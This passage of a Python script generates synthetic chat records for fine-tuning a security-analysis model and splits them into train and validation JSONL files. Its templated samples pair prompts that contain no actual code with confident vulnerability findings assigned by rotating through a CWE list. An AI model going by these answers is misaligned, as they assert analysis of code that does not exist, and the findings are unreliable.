                {"role": "assistant", "content": assistant_resp}
            ]
        })
        
    # Synthesize diverse realistic security scenarios to reach target sample count
    langs = ["c", "cpp", "python", "javascript", "go", "java", "php", "rust"]
    cwes = [
        ("CWE-89", "SQL Injection", "database query parameterized binding"),
        ("CWE-79", "Cross-Site Scripting", "context-aware HTML entity encoding"),
        ("CWE-78", "OS Command Injection", "safe argument arrays without shell expansion"),
        ("CWE-120", "Buffer Overflow", "bounds-checked copying API"),
        ("CWE-416", "Use-After-Free", "setting dangling pointers to NULL"),
        ("CWE-22", "Path Traversal", "canonical path validation against base directory"),
        ("CWE-918", "Server-Side Request Forgery", "strict egress IP allowlisting"),
        ("CWE-502", "Deserialization of Untrusted Data", "safe JSON / cryptographic HMAC authentication"),
        ("CWE-352", "Cross-Site Request Forgery", "SameSite cookies and cryptographic anti-CSRF tokens"),
        ("CWE-287", "Improper Authentication", "centralized RBAC session middleware"),
        ("CWE-434", "Unrestricted File Upload", "file extension/MIME validation and random hash renaming"),
        ("CWE-862", "Missing Authorization / IDOR", "server-side user ownership verification")
    ]
    
    seed_idx = 1
    while len(dataset) < num_samples:
        cwe_id, cwe_name, rem_method = cwes[seed_idx % len(cwes)]
        lang = langs[seed_idx % len(langs)]
        
        user_prompt = (
            f"Perform a static security analysis on the following {lang} function to identify potential security flaws, "
            f"CWE mappings, and provide a secure patch:\n\n"
            f"```{lang}\n"
            f"// Scenario #{seed_idx}: Service Handler Processing Untrusted Client Input\n"
            f"// Input receives untrusted stream data\n"
            f"```"
        )
        
        asst_prompt = (
            f"### Vulnerability Analysis\n"
            f"- **Vulnerability:** {cwe_id} ({cwe_name})\n"
            f"- **Taint / Flow Analysis:**\n"
            f"  - **Source:** Untrusted user input received via HTTP/network request.\n"
            f"  - **Sink:** Unsanitized execution in core service logic.\n"
            f"- **Root Cause:** Direct processing of user input without strict bounds, validation, or encoding triggers {cwe_name}.\n"
            f"- **Remediation:** Apply {rem_method} and validate all input boundaries before execution."
        )
        
        dataset.append({
            "messages": [
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": user_prompt},
                {"role": "assistant", "content": asst_prompt}
            ]
        })
        seed_idx += 1
        
    return dataset

def main():
    print("[Info] Generating high-quality cybersecurity dataset for Azure AI Foundry...")
    records = generate_dataset(num_samples=120)
    
    random.seed(42)
    random.shuffle(records)
    
    # 80/20 Train-Validation Split
    val_size = int(round(len(records) * 0.20))
    val_records = records[:val_size]
    train_records = records[val_size:]
    
    with open("train.jsonl", "w", encoding="utf-8") as f:
        for r in train_records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
            
    with open("val.jsonl", "w", encoding="utf-8") as f:
        for r in val_records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
            
    with open("validation.jsonl", "w", encoding="utf-8") as f:
        for r in val_records:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
            
    print(f"[Done] Created 80/20 split:")
    print(f"  - train.jsonl: {len(train_records)} samples (80%)")
    print(f"  - val.jsonl:   {len(val_records)} samples (20%)")

if __name__ == "__main__":
    main()

